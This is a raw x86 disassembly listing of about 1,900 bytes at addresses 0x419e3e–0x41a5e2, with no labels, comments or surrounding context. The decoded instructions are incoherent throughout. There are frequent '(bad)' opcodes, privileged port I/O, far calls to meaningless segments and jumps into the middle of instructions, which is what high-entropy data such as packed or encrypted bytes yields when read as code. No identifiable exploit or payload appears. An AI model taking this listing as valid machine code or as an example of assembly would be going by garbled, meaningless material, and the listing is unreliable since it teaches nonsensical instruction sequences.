  419e3e:	inc    eax
  419e3f:	push   ecx
  419e40:	jg     0x419e3a
  419e42:	es adc eax,0xf8f4ca7c
  419e48:	mov    esp,0xa416ae39
  419e4d:	xor    bl,BYTE PTR [eax+0xd799772]
  419e53:	dec    esp
  419e54:	sub    dh,BYTE PTR [ebx+eiz*1-0x2a]
  419e58:	mov    dl,0xfa
  419e5a:	(bad)  
  419e5b:	mov    edi,0xbaa32def
  419e60:	leave  
  419e61:	xchg   ebx,eax
  419e62:	jno    0x419de7
  419e64:	retf   0x867e
  419e67:	sqrtps xmm0,XMMWORD PTR [eax]
  419e6a:	jecxz  0x419e9a
  419e6c:	pop    edx
  419e6d:	xchg   edi,eax
  419e6e:	mov    esp,0xb293e8e3
  419e73:	or     DWORD PTR [ebx],esp
  419e75:	hlt    
  419e76:	mov    ebx,0xa5a8b6bf
  419e7b:	dec    esi
  419e7c:	mul    BYTE PTR [ecx]
  419e7e:	rcl    DWORD PTR [edx+0x35],1
  419e81:	in     al,dx
  419e82:	jne    0x419ea9
  419e84:	dec    edi
  419e85:	aad    0xd2
  419e87:	or     eax,0x3854ca18
  419e8c:	mov    esp,0x9a491414
  419e91:	pop    eax
  419e92:	mov    WORD PTR [eax+0x5f142f60],fs
  419e98:	js     0x419f18
  419e9a:	xchg   esi,eax
  419e9b:	in     eax,0x7b
  419e9d:	pushf  
  419e9e:	in     al,dx
  419e9f:	in     al,dx
  419ea0:	sub    BYTE PTR [ecx-0x79],0x60
  419ea4:	pop    es
  419ea5:	xor    eax,0xbedf630b
  419eaa:	fld    QWORD PTR ds:0xa821d11d
  419eb0:	fld    st(5)
  419eb2:	int3   
  419eb3:	jne    0x419ef4
  419eb5:	sti    
  419eb6:	fcom   QWORD PTR [ecx-0x16]
  419eb9:	pop    ds
  419eba:	cli    
  419ebb:	je     0x419e8b
  419ebd:	cs cwde 
  419ebf:	dec    esp
  419ec0:	jl     0x419e47
  419ec2:	shr    DWORD PTR [eax],0x4c
  419ec5:	jno    0x419f44
  419ec7:	push   ss
  419ec8:	aad    0xea
  419eca:	cmc    
  419ecb:	dec    edx
  419ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ecd:	mov    ah,0xa7
  419ecf:	repnz add edx,DWORD PTR [esi-0x72]
  419ed3:	or     edi,esp
  419ed5:	cmc    
  419ed6:	pop    ds
  419ed7:	leave  
  419ed8:	cmp    DWORD PTR [ebx+0x1e],ecx
  419edb:	std    
  419edc:	js     0x419f30
  419ede:	scas   eax,DWORD PTR es:[edi]
  419edf:	(bad)  
  419ee1:	push   esi
  419ee2:	xchg   ecx,eax
  419ee3:	in     al,0x35
  419ee5:	stc    
  419ee6:	mov    ebx,0xd701abb5
  419eeb:	cmp    dl,BYTE PTR [eax-0x1f]
  419eee:	fnstenv [edx-0xf]
  419ef1:	pop    edi
  419ef2:	stos   DWORD PTR es:[edi],eax
  419ef3:	gs mov edi,0x77cc15f8
  419ef9:	xor    DWORD PTR [esi+0x72282547],esp
  419eff:	mov    al,0xaa
  419f01:	inc    edx
  419f02:	test   al,0xbc
  419f04:	pop    edx
  419f05:	nop
  419f06:	mov    ch,0x67
  419f08:	test   DWORD PTR [ebp-0x7515659a],edi
  419f0e:	out    0x8b,eax
  419f10:	ror    BYTE PTR [esi],cl
  419f12:	cmp    BYTE PTR [edx-0x9],bl
  419f15:	cs sbb eax,edx
  419f18:	lods   al,BYTE PTR ds:[esi]
  419f19:	xor    ebp,DWORD PTR cs:[eax-0x1e]
  419f1d:	xchg   edi,eax
  419f1e:	mov    al,0xef
  419f20:	inc    ecx
  419f21:	mov    eax,ds:0x26ca7d32
  419f26:	or     esi,edi
  419f28:	mov    eax,ds:0x2155a78f
  419f2e:	mov    ecx,0x376e1a9b
  419f33:	out    0xb5,al
  419f35:	push   esp
  419f36:	push   ebx
  419f37:	inc    ebp
  419f38:	adc    edx,DWORD PTR [eax+ebx*1]
  419f3b:	ins    BYTE PTR es:[edi],dx
  419f3c:	xchg   esp,eax
  419f3d:	or     BYTE PTR [eax+ebp*8],bl
  419f40:	mov    ebx,0x448151d6
  419f45:	mov    ds:0x9f2965a2,al
  419f4a:	in     al,dx
  419f4b:	mov    edx,0x368e8e74
  419f50:	sub    esp,DWORD PTR [edx+0x63ad1859]
  419f56:	push   0xffffffc5
  419f58:	mov    ds:0xf9e03479,eax
  419f5d:	loope  0x419f29
  419f5f:	jns    0x419fc4
  419f61:	adc    edx,DWORD PTR [edx-0x42967836]
  419f67:	adc    eax,0xd8eaf435
  419f6c:	pop    edx
  419f6d:	loopne 0x419fd7
  419f6f:	in     al,0x71
  419f71:	cwde   
  419f72:	pmaxsw mm5,mm4
  419f75:	jno    0x419f8d
  419f77:	icebp  
  419f78:	aas    
  419f79:	sar    BYTE PTR [ecx+edx*1-0x2e],1
  419f7d:	inc    ebx
  419f7e:	data16 sub bl,BYTE PTR [eax]
  419f81:	jne    0x419f95
  419f83:	bndldx (bad),[edi+ebp*1-0x39]
  419f88:	or     DWORD PTR [ebx],edx
  419f8a:	xlat   BYTE PTR ss:[ebx]
  419f8c:	adc    eax,0x4ee6dd75
  419f91:	add    al,0x5e
  419f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f94:	lea    ebp,[edi+0x17]
  419f97:	cmp    eax,0xa1500da9
  419f9c:	test   bh,cl
  419f9e:	cldemote BYTE PTR [esi-0x7]
  419fa2:	xor    eax,0xd1f26adc
  419fa7:	xchg   BYTE PTR [eax+0x2307c5f0],dh
  419fad:	fcomp  DWORD PTR [ebp+0x2b23ecef]
  419fb3:	outs   dx,BYTE PTR ds:[esi]
  419fb4:	scas   eax,DWORD PTR es:[edi]
  419fb5:	or     DWORD PTR [eax+0x4b],ecx
  419fb8:	(bad)  
  419fb9:	fisub  DWORD PTR [ebx+0x3c8b7143]
  419fbf:	clc    
  419fc0:	loop   0x419ffb
  419fc2:	mov    ch,BYTE PTR [ecx]
  419fc4:	repnz into 
  419fc6:	dec    edx
  419fc7:	mov    dl,0x69
  419fc9:	or     DWORD PTR [ebx-0x5a09e1ab],ecx
  419fcf:	mov    bh,BYTE PTR [eax+0x223ec1b3]
  419fd5:	pop    ebp
  419fd6:	jge    0x41a008
  419fd8:	push   ss
  419fd9:	stos   DWORD PTR es:[edi],eax
  419fda:	int3   
  419fdb:	sub    DWORD PTR [eax-0x53],ebx
  419fde:	daa    
  419fdf:	(bad)  
  419fe0:	push   ds
  419fe1:	mov    eax,ds:0xcc7258e8
  419fe6:	in     eax,dx
  419fe7:	inc    eax
  419fe8:	call   0x49b5:0x6d55eec1
  419fef:	jno    0x419fed
  419ff1:	sub    DWORD PTR ss:[ebx+esi*4-0xb],eax
  419ff6:	js     0x419fed
  419ff8:	adc    bl,BYTE PTR [ecx+edi*2]
  419ffb:	jmp    FWORD PTR [eax]
  419ffd:	jnp    0x419f9d
  419fff:	std    
  41a000:	cmp    al,0x69
  41a002:	dec    esp
  41a003:	call   0x4f:0x7cd57557
  41a00a:	mov    eax,ds:0xf76714f2
  41a00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a010:	mov    BYTE PTR [eax],ah
  41a012:	mov    ah,BYTE PTR [esi-0xb]
  41a015:	pusha  
  41a016:	repnz and al,0x7d
  41a019:	stos   DWORD PTR es:[edi],eax
  41a01a:	dec    edx
  41a01b:	ins    DWORD PTR es:[edi],dx
  41a01c:	fisubr WORD PTR [edx-0x64135e46]
  41a022:	or     DWORD PTR ds:0x66cd5b37,edi
  41a028:	mov    eax,0x10a7d8b6
  41a02d:	aam    0x90
  41a02f:	push   cs
  41a030:	in     al,dx
  41a031:	cli    
  41a032:	(bad)  
  41a034:	mov    cl,0xf
  41a036:	retf   
  41a037:	pop    ds
  41a038:	nop
  41a039:	mov    WORD PTR [edx-0x14596969],ds
  41a03f:	test   ch,al
  41a041:	loop   0x41a025
  41a043:	(bad)  
  41a044:	fidivr WORD PTR [ecx+0x38e21dd4]
  41a04a:	pop    ecx
  41a04b:	stc    
  41a04c:	int3   
  41a04d:	inc    edx
  41a04e:	adc    eax,0x7efef5e9
  41a053:	inc    ecx
  41a054:	fs cmc 
  41a056:	xor    ch,0xce
  41a059:	fsubr  QWORD PTR [eax+ebp*1+0x52]
  41a05d:	or     edx,DWORD PTR [eax]
  41a05f:	inc    ebx
  41a060:	call   0x2d95:0x54134b67
  41a067:	sub    ch,0x8b
  41a06a:	xor    al,0xf0
  41a06c:	pop    edi
  41a06d:	test   DWORD PTR [edi],0x841957d8
  41a073:	test   eax,0x3f30d9fc
  41a078:	xchg   esi,eax
  41a079:	inc    esp
  41a07a:	(bad)  
  41a07b:	stos   DWORD PTR es:[edi],eax
  41a07c:	adc    eax,0xfcc50a96
  41a081:	or     BYTE PTR [edx+0x78],ch
  41a084:	out    dx,eax
  41a085:	push   0x8ba6bd66
  41a08a:	cmc    
  41a08b:	int3   
  41a08c:	xor    BYTE PTR es:[edi-0x5d88b0ba],bh
  41a093:	inc    eax
  41a094:	mov    dh,0xf4
  41a096:	lock sub al,0xc6
  41a099:	add    DWORD PTR [edi-0x17850646],esp
  41a09f:	aad    0x70
  41a0a1:	pop    edi
  41a0a2:	xchg   ebx,eax
  41a0a3:	cmp    DWORD PTR ds:0x60618d16,ecx
  41a0a9:	aaa    
  41a0aa:	sbb    al,0xe8
  41a0ac:	push   eax
  41a0ad:	mov    esi,0x214dcff4
  41a0b2:	dec    esi
  41a0b3:	adc    eax,esi
  41a0b5:	sbb    al,0x1c
  41a0b7:	jns    0x41a0b7
  41a0b9:	or     al,0xf9
  41a0bb:	test   esp,0xe2d20c18
  41a0c1:	push   ebp
  41a0c2:	jns    0x41a128
  41a0c4:	pop    ss
  41a0c5:	pop    ds
  41a0c6:	sbb    eax,0x5f2808d
  41a0cb:	mov    BYTE PTR [edx+0x6d],dh
  41a0ce:	ja     0x41a107
  41a0d0:	pop    ebx
  41a0d1:	add    al,0xe6
  41a0d3:	and    eax,0xf66154a
  41a0d8:	mov    ds:0xf22d8356,al
  41a0dd:	xor    DWORD PTR [esi-0x7d],esi
  41a0e0:	sub    BYTE PTR [eax+0x484e640f],0x13
  41a0e7:	jge    0x41a09c
  41a0e9:	adc    al,0xfb
  41a0eb:	fidiv  DWORD PTR [esp+ebx*4-0x21f671ef]
  41a0f2:	pusha  
  41a0f3:	push   ebp
  41a0f4:	daa    
  41a0f5:	push   0x66
  41a0f7:	cmp    dl,ah
  41a0f9:	push   0xd2ecf3cd
  41a0fe:	sbb    al,0x3a
  41a100:	mov    WORD PTR [ebp+0x509714e9],fs
  41a106:	es add al,0x74
  41a109:	shl    edx,1
  41a10b:	sbb    dh,bh
  41a10d:	fidivr DWORD PTR [ebx+0x15e199b8]
  41a113:	push   eax
  41a114:	jae    0x41a0a6
  41a116:	fistp  DWORD PTR [edx+ebp*8]
  41a119:	mov    eax,ds:0x1de57e8d
  41a11e:	dec    ebp
  41a11f:	pushf  
  41a120:	and    eax,0x776bbfec
  41a125:	mov    ebp,0xc83c9abe
  41a12a:	and    al,0x16
  41a12c:	(bad)  
  41a12d:	and    eax,0x65c632df
  41a132:	xchg   ecx,eax
  41a133:	add    eax,edx
  41a135:	xor    DWORD PTR [ecx],ebp
  41a137:	ds jge 0x41a139
  41a13a:	shl    DWORD PTR [ebx],cl
  41a13c:	push   esp
  41a13d:	mov    edx,0x88ec6482
  41a142:	xor    BYTE PTR [edx-0x51d76843],bl
  41a148:	mov    bl,0xe7
  41a14a:	cli    
  41a14b:	sub    edi,DWORD PTR [ebx]
  41a14d:	pop    ebp
  41a14e:	lock in eax,0x83
  41a151:	fidivr WORD PTR [edx+0x4f]
  41a154:	loop   0x41a160
  41a156:	pop    edi
  41a157:	mov    dl,0xf2
  41a159:	or     cl,BYTE PTR [ecx+0x34]
  41a15c:	add    ebp,DWORD PTR [eax-0xab53d8a]
  41a162:	hlt    
  41a163:	xchg   DWORD PTR [edi+0x69],ebp
  41a166:	mov    esi,DWORD PTR [edx]
  41a168:	cmp    cl,BYTE PTR [edx-0x6a9019b7]
  41a16e:	pop    ds
  41a16f:	nop
  41a170:	imul   edx,DWORD PTR [esi],0x6
  41a173:	mov    ebx,0x3e4dbac4
  41a178:	nop
  41a179:	pop    eax
  41a17a:	mov    bh,0x53
  41a17c:	mov    edi,0x357164d
  41a181:	retf   0x5492
  41a184:	and    bh,BYTE PTR [ebp+0x61893251]
  41a18a:	push   edx
  41a18c:	rol    BYTE PTR [ecx],1
  41a18e:	jns    0x41a190
  41a190:	push   ebp
  41a191:	data16 test al,ch
  41a194:	add    dl,bl
  41a196:	stos   DWORD PTR es:[edi],eax
  41a197:	aam    0x8c
  41a199:	inc    ebp
  41a19a:	sub    ah,0xe7
  41a19d:	cmp    DWORD PTR [ebp-0x4b],esp
  41a1a0:	mov    eax,0x5d216b1c
  41a1a5:	sub    ecx,DWORD PTR [eax-0x22d3fd3e]
  41a1ab:	sar    BYTE PTR [edx+0x5b4d5c2a],cl
  41a1b1:	(bad)
  41a1b4:	loopne 0x41a19c
  41a1b6:	cmc    
  41a1b7:	ds push esi
  41a1b9:	pushw  es
  41a1bb:	(bad)
  41a1bf:	arpl   WORD PTR [edx+0x64452614],bp
  41a1c5:	xor    eax,0xd5035a6e
  41a1ca:	retf   0x43f5
  41a1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ce:	loop   0x41a1a8
  41a1d0:	sub    DWORD PTR [edx+edx*1-0x32f549c0],ecx
  41a1d7:	adc    eax,0xe972d4e0
  41a1dc:	das    
  41a1dd:	xchg   esp,eax
  41a1de:	and    esp,DWORD PTR [ebx]
  41a1e0:	push   ecx
  41a1e1:	imul   BYTE PTR [ebx-0x3c]
  41a1e4:	out    dx,al
  41a1e5:	retf   
  41a1e6:	pop    ebp
  41a1e7:	repnz test DWORD PTR [esp+edi*1-0x285101a9],esp
  41a1ef:	cli    
  41a1f0:	mov    esi,DWORD PTR gs:[ecx]
  41a1f3:	push   edx
  41a1f4:	cli    
  41a1f5:	mov    edx,0x1aaec5a1
  41a1fa:	pop    ebx
  41a1fb:	xor    DWORD PTR [ebp-0x4f6ac5f6],edi
  41a201:	out    0x8,al
  41a203:	repz out 0x79,al
  41a206:	dec    edx
  41a207:	add    dh,dh
  41a209:	into   
  41a20a:	call   0xfa6b0313
  41a20f:	and    ch,BYTE PTR [ebx]
  41a211:	xchg   BYTE PTR [edi-0x4],ah
  41a214:	jno    0x41a21e
  41a216:	int3   
  41a217:	aaa    
  41a218:	repz add dh,ch
  41a21b:	sar    DWORD PTR ds:0x3a370050,1
  41a221:	hlt    
  41a222:	mov    DWORD PTR [edi],esi
  41a224:	sub    DWORD PTR [edi+0x41149f83],0x21
  41a22b:	xchg   DWORD PTR [ecx-0x60],ebp
  41a22e:	mov    edi,0x9f77948a
  41a233:	push   ss
  41a234:	fadd   DWORD PTR [ebp+0x65]
  41a237:	push   es
  41a238:	sbb    al,0xc0
  41a23a:	test   al,0xdd
  41a23c:	sar    BYTE PTR [edi],1
  41a23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a23f:	mov    ecx,0x22a5cab1
  41a244:	sbb    bh,BYTE PTR [edi]
  41a246:	xchg   esp,eax
  41a247:	sbb    ebp,DWORD PTR [eax]
  41a249:	test   eax,0xaeb543da
  41a24e:	aam    0x5b
  41a250:	popa   
  41a251:	lock sub edi,DWORD PTR [esi-0x36]
  41a255:	adc    al,0x6c
  41a257:	fdivr  QWORD PTR [ebx]
  41a259:	pop    ds
  41a25a:	(bad)  
  41a25b:	xor    BYTE PTR [edx],bl
  41a25d:	xor    DWORD PTR [edx+0x4],ebx
  41a260:	jae    0x41a22f
  41a262:	cwde   
  41a263:	mov    ah,ah
  41a265:	and    BYTE PTR [ebp+0x48678da2],0xc1
  41a26c:	shl    DWORD PTR [ebp+0x4a],cl
  41a26f:	nop
  41a270:	shl    ah,1
  41a272:	xchg   ebx,eax
  41a273:	mov    dl,0xb8
  41a275:	add    dl,dh
  41a277:	mov    eax,0xa14310ed
  41a27c:	jmp    0x41a285
  41a27e:	scas   eax,DWORD PTR es:[edi]
  41a27f:	in     eax,dx
  41a280:	stc    
  41a281:	popf   
  41a282:	jge    0x41a271
  41a284:	push   cs
  41a285:	mov    ecx,0xbf2d65fb
  41a28a:	dec    ebp
  41a28b:	lahf   
  41a28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a28d:	jb     0x41a2fa
  41a28f:	inc    esi
  41a290:	xlat   BYTE PTR ds:[ebx]
  41a291:	pusha  
  41a292:	xchg   ebp,eax
  41a293:	repnz out dx,al
  41a295:	test   al,0x1a
  41a297:	mov    eax,0x9be0add3
  41a29c:	add    eax,0x9134993a
  41a2a1:	jl     0x41a2f3
  41a2a3:	xor    ebp,DWORD PTR [edx]
  41a2a5:	or     al,0xa4
  41a2a7:	cs (bad) 
  41a2a9:	aaa    
  41a2aa:	pop    ecx
  41a2ab:	push   edx
  41a2ac:	retf   0x6220
  41a2af:	jns    0x41a240
  41a2b1:	push   DWORD PTR [eax-0x2f]
  41a2b4:	mov    eax,ds:0x73aed064
  41a2b9:	pop    edi
  41a2ba:	mov    ebx,0xef1487d9
  41a2bf:	push   eax
  41a2c0:	jne    0x41a28f
  41a2c2:	jae    0x41a29e
  41a2c4:	inc    ecx
  41a2c5:	dec    edi
  41a2c6:	addr16 je 0x41a2cf
  41a2c9:	mov    cl,0xc8
  41a2cb:	push   edx
  41a2cc:	shr    DWORD PTR [ecx-0x2b],cl
  41a2cf:	cld    
  41a2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d1:	lock fwait
  41a2d3:	aas    
  41a2d4:	lock (bad) 
  41a2d6:	ins    DWORD PTR es:[edi],dx
  41a2d7:	cmp    eax,DWORD PTR [ebx]
  41a2d9:	xchg   edi,esi
  41a2db:	push   ds
  41a2dc:	pop    edi
  41a2dd:	loop   0x41a33b
  41a2df:	adc    bl,bh
  41a2e1:	and    BYTE PTR [ebx+0x4cfa65f7],dl
  41a2e7:	push   cs
  41a2e8:	xor    al,0xfd
  41a2ea:	jno    0x41a27a
  41a2ec:	shl    ebp,1
  41a2ee:	push   cs
  41a2ef:	into   
  41a2f0:	mov    ebp,0xbd034c22
  41a2f5:	(bad)  
  41a2f7:	cmc    
  41a2f8:	dec    ebx
  41a2f9:	inc    esi
  41a2fa:	into   
  41a2fb:	(bad)  
  41a2fc:	ficom  WORD PTR [edi+0x3f81ad7a]
  41a302:	shl    DWORD PTR [ebp-0x44],1
  41a305:	retf   0x28b6
  41a308:	loopne 0x41a304
  41a30a:	inc    edi
  41a30b:	and    cl,BYTE PTR [eax-0x2fe97d4c]
  41a311:	inc    esp
  41a312:	sar    bh,1
  41a314:	in     al,0xe4
  41a316:	retf   0x6642
  41a319:	adc    ah,BYTE PTR [eax]
  41a31b:	cmc    
  41a31c:	icebp  
  41a31d:	jnp    0x41a39e
  41a31f:	dec    ebx
  41a320:	xlat   BYTE PTR ds:[ebx]
  41a321:	(bad)  
  41a324:	mov    edx,0xa80da6b1
  41a329:	adc    edx,esp
  41a32b:	cmp    BYTE PTR [ecx],cl
  41a32d:	cli    
  41a32e:	jp     0x41a342
  41a330:	paddsw mm5,QWORD PTR [eax-0x78bd96a9]
  41a337:	aas    
  41a338:	mov    ch,0x52
  41a33a:	xor    al,0x46
  41a33c:	jns    0x41a2cf
  41a33e:	jbe    0x41a359
  41a340:	out    dx,eax
  41a341:	or     BYTE PTR [ebx-0x4a6a1ec8],ah
  41a347:	pop    ebx
  41a348:	fst    DWORD PTR [esi-0x5c6832fc]
  41a34e:	push   ebp
  41a34f:	push   cs
  41a350:	sti    
  41a351:	xor    DWORD PTR [eax-0x6e6ebf6b],esp
  41a357:	jae    0x41a2f7
  41a359:	test   DWORD PTR [ebx+ecx*4],0xb948f24c
  41a360:	pop    ebx
  41a361:	shl    DWORD PTR [ebx],0xd7
  41a364:	push   edi
  41a365:	in     al,dx
  41a366:	add    edx,esp
  41a368:	pop    ds
  41a369:	push   ebp
  41a36a:	mov    ds:0x2bd42146,al
  41a36f:	std    
  41a370:	frstpm(287 only) 
  41a372:	mov    esi,0xad162e80
  41a377:	mov    cl,0x7b
  41a379:	xchg   ebp,eax
  41a37a:	inc    edx
  41a37b:	fs loopne 0x41a356
  41a37e:	lods   al,BYTE PTR ds:[esi]
  41a37f:	bound  ebx,QWORD PTR [ebx+ebp*4+0x62bd081f]
  41a386:	rcr    DWORD PTR [ebx+0x76],0xc0
  41a38a:	aaa    
  41a38b:	xor    al,0x65
  41a38d:	cmp    eax,0xa8b64392
  41a392:	mov    ecx,0xda32c5bd
  41a397:	shr    BYTE PTR [edx],cl
  41a399:	jp     0x41a3bf
  41a39b:	std    
  41a39c:	(bad)  
  41a39d:	xor    BYTE PTR [ecx],bl
  41a39f:	(bad)  
  41a3a0:	or     al,0x90
  41a3a2:	mov    fs,WORD PTR [edx-0x6]
  41a3a5:	call   0xcb22:0xfeed6e28
  41a3ac:	jg     0x41a3b1
  41a3ae:	(bad)  
  41a3af:	pushf  
  41a3b0:	jo     0x41a414
  41a3b2:	mov    ds,ecx
  41a3b4:	test   bh,al
  41a3b6:	jmp    0x41a350
  41a3b8:	mov    dh,0x0
  41a3ba:	xchg   edx,eax
  41a3bb:	xchg   esi,eax
  41a3bc:	fidiv  WORD PTR [ecx]
  41a3be:	jns    0x41a381
  41a3c0:	sub    al,0xf
  41a3c2:	jge    0x41a3fb
  41a3c4:	pop    edi
  41a3c5:	fistp  QWORD PTR [edi-0x35850b77]
  41a3cb:	jns    0x41a3c7
  41a3cd:	sar    edi,1
  41a3cf:	imul   ecx,DWORD PTR [esi],0xe257b816
  41a3d5:	(bad)  
  41a3d6:	sbb    DWORD PTR [ecx+0x140e028e],ebx
  41a3dc:	add    bl,BYTE PTR [esi]
  41a3de:	std    
  41a3df:	sbb    ebp,0x7c00ec0d
  41a3e5:	or     DWORD PTR [ecx*4-0x1e06e7d5],esp
  41a3ec:	jo     0x41a435
  41a3ee:	add    cl,dl
  41a3f0:	adc    DWORD PTR [eax+0x1a],esi
  41a3f3:	dec    ebp
  41a3f4:	mov    esp,0x8c2ee5a0
  41a3f9:	pop    ebp
  41a3fa:	cmp    bl,BYTE PTR [esi+0xf2f7785]
  41a400:	outs   dx,DWORD PTR ds:[esi]
  41a401:	inc    BYTE PTR [esp+ebp*8-0x5e4ab6a0]
  41a408:	test   eax,0x29fd942a
  41a40d:	bnd je 0x41a3de
  41a410:	mov    dh,0x86
  41a412:	mov    bh,0xe6
  41a414:	jp     0x41a3ac
  41a416:	xor    esp,DWORD PTR [edi-0x342ab578]
  41a41c:	(bad)  
  41a41d:	cmp    al,0xa
  41a41f:	ror    DWORD PTR [eiz*1-0x25e68bf0],1
  41a426:	(bad)  
  41a427:	push   0x5018d289
  41a42c:	nop
  41a42d:	hlt    
  41a42e:	push   ecx
  41a42f:	cwde   
  41a430:	test   eax,0xe1475e9d
  41a435:	jnp    0x41a43a
  41a437:	xor    al,al
  41a439:	cmp    DWORD PTR [eax+0x33],ecx
  41a43c:	stos   DWORD PTR es:[edi],eax
  41a43d:	adc    ebp,ebx
  41a43f:	mov    es,WORD PTR [edx+edi*8-0x3dc11793]
  41a446:	cld    
  41a447:	sub    BYTE PTR ds:0xc00e2902,ch
  41a44d:	cmp    bl,dh
  41a44f:	lock out dx,eax
  41a451:	push   0x7b
  41a453:	and    eax,0xe2fb1ff6
  41a458:	shl    DWORD PTR [edx-0x6b],cl
  41a45b:	xchg   esi,eax
  41a45c:	imul   edi,DWORD PTR [ebp-0x72],0xeb95bc91
  41a463:	lods   al,BYTE PTR ds:[esi]
  41a464:	add    ah,BYTE PTR [ebp+0x47]
  41a467:	aas    
  41a468:	arpl   WORD PTR [ebx+0x5d9b434b],sp
  41a46e:	jl     0x41a483
  41a470:	out    dx,eax
  41a471:	mov    edi,0xc31cb809
  41a476:	add    BYTE PTR [ecx],cl
  41a478:	test   al,0x36
  41a47a:	xchg   esp,eax
  41a47b:	pop    eax
  41a47c:	mov    ds:0xcf723e6d,al
  41a481:	add    bl,BYTE PTR [esi-0x51]
  41a484:	lods   al,BYTE PTR ds:[esi]
  41a485:	pop    edi
  41a486:	inc    eax
  41a487:	test   DWORD PTR [eax+ebx*8-0x6f26bb1],edx
  41a48e:	mov    esp,0xc70d3dd6
  41a493:	mov    cl,0xe9
  41a495:	dec    eax
  41a496:	dec    esp
  41a497:	mov    dl,0xb5
  41a499:	fistp  DWORD PTR [ebp-0x74d4cdc6]
  41a49f:	sbb    bh,BYTE PTR [ecx]
  41a4a1:	push   cs
  41a4a2:	cmp    al,0x23
  41a4a4:	mov    ecx,0x775b1002
  41a4a9:	arpl   WORD PTR [ebp+eiz*1-0x6e],dx
  41a4ad:	sbb    DWORD PTR [ebx+0x3a],esp
  41a4b0:	ss pop ebp
  41a4b2:	dec    eax
  41a4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4b4:	pop    ecx
  41a4b5:	push   esi
  41a4b6:	fisubr DWORD PTR ds:0xe552129b
  41a4bc:	rcl    bl,1
  41a4be:	dec    ebp
  41a4bf:	fld    TBYTE PTR [eax+0x6595532d]
  41a4c5:	mov    ebx,0x5b0df974
  41a4ca:	nop
  41a4cb:	mov    al,ds:0x661d5e2
  41a4d0:	sahf   
  41a4d1:	xor    ah,BYTE PTR [ebp+0x1e]
  41a4d4:	push   esi
  41a4d5:	rcl    ah,1
  41a4d7:	into   
  41a4d8:	out    dx,eax
  41a4d9:	cmp    ah,BYTE PTR [edi-0x46fbe9ea]
  41a4df:	push   0x5
  41a4e1:	sub    esp,DWORD PTR [ecx-0x68a8bf4]
  41a4e7:	pop    edx
  41a4e8:	sbb    DWORD PTR [ecx],0x49
  41a4eb:	jae    0x41a50c
  41a4ed:	adc    edx,DWORD PTR [eax]
  41a4ef:	xchg   edx,eax
  41a4f0:	popf   
  41a4f1:	js     0xd6741a46
  41a4f7:	pop    ds
  41a4f8:	cmp    DWORD PTR [ebx-0x42],0xfda3307b
  41a4ff:	adc    DWORD PTR ds:0x26d8f228,0x50
  41a506:	xchg   esp,eax
  41a507:	loop   0x41a4a0
  41a509:	sub    al,0xdf
  41a50b:	mov    ch,0x7c
  41a50d:	ins    DWORD PTR es:[edi],dx
  41a50e:	iret   
  41a50f:	xchg   ebp,eax
  41a510:	cmc    
  41a511:	in     al,0xce
  41a513:	ficom  DWORD PTR [esi-0x13d1974f]
  41a519:	sbb    BYTE PTR [ebx],bh
  41a51b:	xlat   BYTE PTR ds:[ebx]
  41a51c:	push   ebx
  41a51d:	mov    al,0x63
  41a51f:	mov    ds:0x8c171f34,eax
  41a524:	adc    BYTE PTR [edi-0x6d],bh
  41a527:	mov    eax,ds:0x60503090
  41a52c:	push   es
  41a52d:	nop
  41a52e:	dec    ebp
  41a52f:	mov    edi,0x91c67c8
  41a534:	out    dx,al
  41a535:	push   ebp
  41a536:	rol    DWORD PTR [ebp+0x30eb7011],cl
  41a53c:	out    0x75,eax
  41a53e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a53f:	lea    ebx,[edi+esi*2+0x74]
  41a543:	mov    edx,0xf99f9f39
  41a548:	(bad)  
  41a549:	(bad)  
  41a54b:	mov    bh,BYTE PTR es:[eax+edi*4+0x76]
  41a550:	mov    bh,0xd4
  41a552:	mov    eax,ds:0x19523662
  41a557:	pop    ecx
  41a558:	test   al,0x38
  41a55a:	mov    ds:0x3392f1ba,eax
  41a55f:	fisttp WORD PTR [edi+0x47]
  41a562:	inc    ebx
  41a563:	lahf   
  41a564:	(bad)  
  41a565:	or     bl,BYTE PTR [eax+ebx*4]
  41a568:	leave  
  41a569:	lds    ebx,FWORD PTR [ecx+0x1a]
  41a56c:	lds    eax,FWORD PTR [ecx+0x2c3706c8]
  41a572:	gs xor eax,0xb832d24f
  41a578:	scas   eax,DWORD PTR es:[edi]
  41a579:	imul   edi,DWORD PTR [edi-0x39cd16e9],0x22c3572
  41a583:	inc    ecx
  41a584:	retf   0x3e9b
  41a587:	mov    al,0xbe
  41a589:	repz cmp eax,0x7821568f
  41a58f:	and    edi,DWORD PTR [edx]
  41a591:	sub    eax,0x4720eeed
  41a596:	pop    edi
  41a597:	out    0x14,al
  41a599:	push   edx
  41a59a:	and    al,0xe7
  41a59c:	adc    edi,DWORD PTR [ebx+0x9d85f4c]
  41a5a2:	leave  
  41a5a3:	popa   
  41a5a4:	sbb    eax,0xc54efebc
  41a5a9:	xchg   ebx,eax
  41a5aa:	or     dh,0xc0
  41a5ad:	and    edx,DWORD PTR [eax-0x59]
  41a5b0:	cmp    eax,0x928375a7
  41a5b5:	mov    ds:0xb12470fd,eax
  41a5ba:	lea    edi,[ecx]
  41a5bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5bd:	adc    al,0xb3
  41a5bf:	sbb    BYTE PTR [ebp+0x43],dl
  41a5c2:	stos   DWORD PTR es:[edi],eax
  41a5c3:	loopne 0x41a5d5
  41a5c5:	lods   eax,DWORD PTR ds:[esi]
  41a5c6:	add    DWORD PTR [edx+edi*4+0x21],ecx
  41a5ca:	out    dx,al
  41a5cb:	cmc    
  41a5cc:	repnz mov ah,BYTE PTR [eax+0x1d]
  41a5d0:	scas   al,BYTE PTR es:[edi]
  41a5d1:	div    DWORD PTR [esi-0xa]
  41a5d4:	xchg   ecx,eax
  41a5d5:	add    ebx,DWORD PTR [edx]
  41a5d7:	jne    0x41a5b1
  41a5d9:	mov    cl,0x75
  41a5db:	mov    ds:0x2b211fc1,eax
  41a5e0:	adc    al,ah
  41a5e2:	fsubr  st(6),st
